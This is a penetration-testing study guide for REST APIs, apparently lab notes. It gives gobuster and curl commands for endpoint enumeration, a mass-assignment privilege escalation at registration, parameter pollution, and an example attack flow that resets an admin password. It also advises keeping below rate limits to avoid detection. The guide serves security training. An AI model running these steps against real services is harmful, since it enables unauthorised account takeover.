# API Penetration Testing Guide

## Overview
REST APIs provide backbone functionality for web applications, often handling critical functions like authentication. During black-box testing, discovering and exploiting these APIs requires systematic enumeration and testing.

## Key Concepts

### API Fundamentals
- **REST APIs**: Representational State Transfer - interfaces for backend logic interaction
- **API Versioning**: Common pattern: `/api_name/v1`, `/api_name/v2`
- **Response Codes**:
  - `404 Not Found`: Endpoint doesn't exist
  - `405 Method Not Allowed`: Endpoint exists but wrong HTTP method
  - `200 OK`: Successful request

### Testing Methodology
1. **Discovery**: Enumerate API endpoints without documentation
2. **Interaction**: Test different HTTP methods (GET, POST, PUT, DELETE)
3. **Authentication**: Identify and exploit auth mechanisms
4. **Privilege Escalation**: Look for registration/permission bypasses

## API Enumeration

### Basic Directory Brute Force
```bash
gobuster dir -u http://TARGET:PORT -w /usr/share/wordlists/dirb/big.txt
```
- `-u`: Target URL
- `-w`: Wordlist path

### Pattern-Based Enumeration

1. Create pattern file (e.g., `pattern.txt`):
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

2. Run gobuster with pattern:
```bash
gobuster dir -u http://TARGET:PORT -w /usr/share/wordlists/dirb/big.txt -p pattern
```
- `-p`: Pattern file to append to wordlist entries

### Targeted Endpoint Enumeration
```bash
gobuster dir -u http://TARGET:PORT/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

## API Interaction Techniques

### GET Requests
```bash
# Basic GET request with headers
curl -i http://TARGET:PORT/users/v1

# With specific headers
curl -H "Accept: application/json" http://TARGET:PORT/api/v1/users
```
- `-i`: Include response headers

### POST Requests
```bash
# JSON payload with authentication attempt
curl -d '{"password":"pass","username":"admin"}' \
     -H 'Content-Type: application/json' \
     http://TARGET:PORT/users/v1/login

# Registration with multiple fields
curl -d '{"password":"lab","username":"offsec","email":"test@test.com"}' \
     -H 'Content-Type: application/json' \
     http://TARGET:PORT/users/v1/register
```
- `-d`: Data payload
- `-H`: Header specification

### PUT Requests
```bash
# Update resource with authentication
curl -X 'PUT' \
     'http://TARGET:PORT/users/v1/admin/password' \
     -H 'Content-Type: application/json' \
     -H 'Authorization: OAuth eyJ0eXA...' \
     -d '{"password": "newpassword"}'
```
- `-X`: Specify HTTP method

### DELETE Requests
```bash
curl -X 'DELETE' \
     'http://TARGET:PORT/api/v1/resource/123' \
     -H 'Authorization: Bearer token'
```

## Common API Endpoints

### Authentication & User Management
- `/api/v1/login` - User authentication
- `/api/v1/register` - User registration
- `/api/v1/logout` - Session termination
- `/api/v1/users` - User listing
- `/api/v1/users/{id}` - Specific user details
- `/api/v1/users/{id}/password` - Password management
- `/api/v1/users/{id}/email` - Email management

### Documentation & Debugging
- `/api/docs` - API documentation
- `/swagger` - Swagger UI
- `/ui` - API interface
- `/console` - Debug console
- `/graphql` - GraphQL endpoint

### Common Resources
- `/api/v1/books`
- `/api/v1/products`
- `/api/v1/orders`
- `/api/v1/admin`

## Attack Vectors

### 1. Registration Privilege Escalation
Test for administrative privilege assignment during registration:
```bash
curl -d '{"username":"test","password":"pass","email":"test@test.com","admin":"True"}' \
     -H 'Content-Type: application/json' \
     http://TARGET:PORT/users/v1/register
```

### 2. Method Tampering
When receiving `405 Method Not Allowed`, try alternative methods:
- GET → POST
- POST → PUT
- GET → DELETE
- POST → PATCH

### 3. JWT Token Exploitation
After obtaining a token through login:
```bash
# Use token for privileged operations
curl -H 'Authorization: OAuth eyJ0eXA...' \
     http://TARGET:PORT/api/v1/admin/users
```

### 4. Parameter Pollution
Test for additional parameters:
```bash
# Add unexpected parameters
curl -d '{"username":"user","password":"pass","role":"admin","isAdmin":true}' \
     -H 'Content-Type: application/json' \
     http://TARGET:PORT/api/register
```

## Burp Suite Integration

### Proxy Configuration
Route curl through Burp for analysis:
```bash
curl --proxy 127.0.0.1:8080 http://TARGET:PORT/api/v1/users
```

### Workflow
1. Send initial requests through proxy
2. Use Repeater for manual testing
3. Use Intruder for parameter fuzzing
4. Review Site Map for discovered endpoints
5. Save interesting requests for documentation

## Testing Checklist

- [ ] Enumerate all API versions (v1, v2, v3)
- [ ] Test each endpoint with all HTTP methods
- [ ] Check for documentation endpoints (/ui, /docs, /swagger)
- [ ] Test registration for privilege escalation
- [ ] Attempt authentication bypass
- [ ] Test for JWT token vulnerabilities
- [ ] Check for rate limiting
- [ ] Test input validation
- [ ] Look for information disclosure in errors
- [ ] Test for IDOR vulnerabilities
- [ ] Check for SQL injection in parameters
- [ ] Test for XXE in XML endpoints
- [ ] Verify CORS configuration

## Tools Reference

### Gobuster
- **Purpose**: Directory/file enumeration
- **Key flags**:
  - `-u`: URL
  - `-w`: Wordlist
  - `-p`: Pattern file
  - `-x`: File extensions
  - `-t`: Threads (default 10)

### Curl
- **Purpose**: API interaction
- **Key flags**:
  - `-i`: Include headers
  - `-X`: HTTP method
  - `-d`: Data payload
  - `-H`: Headers
  - `--proxy`: Proxy server

### Useful Wordlists
- `/usr/share/wordlists/dirb/big.txt` - Large general wordlist
- `/usr/share/wordlists/dirb/small.txt` - Quick enumeration
- `/usr/share/wordlists/dirb/common.txt` - Common paths
- `/usr/share/seclists/Discovery/API/api-endpoints.txt` - API-specific

## Example Attack Flow

1. **Initial Enumeration**
   ```bash
   gobuster dir -u http://192.168.45.100:5000 -w /usr/share/wordlists/dirb/common.txt
   ```

2. **API Version Discovery**
   ```bash
   gobuster dir -u http://192.168.45.100:5000 -w /usr/share/wordlists/dirb/big.txt -p pattern
   ```

3. **User Enumeration**
   ```bash
   curl -i http://192.168.45.100:5000/api/v1/users
   ```

4. **Registration Test**
   ```bash
   curl -d '{"username":"attacker","password":"pass","email":"test@test.com","admin":"True"}' \
        -H 'Content-Type: application/json' \
        http://192.168.45.100:5000/api/v1/register
   ```

5. **Authentication**
   ```bash
   curl -d '{"username":"attacker","password":"pass"}' \
        -H 'Content-Type: application/json' \
        http://192.168.45.100:5000/api/v1/login
   ```

6. **Privilege Abuse**
   ```bash
   curl -X 'PUT' \
        'http://192.168.45.100:5000/api/v1/users/admin/password' \
        -H 'Authorization: OAuth [token]' \
        -d '{"password": "pwned"}'
   ```

## Notes
- Always check for API documentation at common paths
- Test both authenticated and unauthenticated access
- Document all findings with request/response pairs
- Consider rate limiting to avoid detection
- Use Burp Suite for complex testing scenarios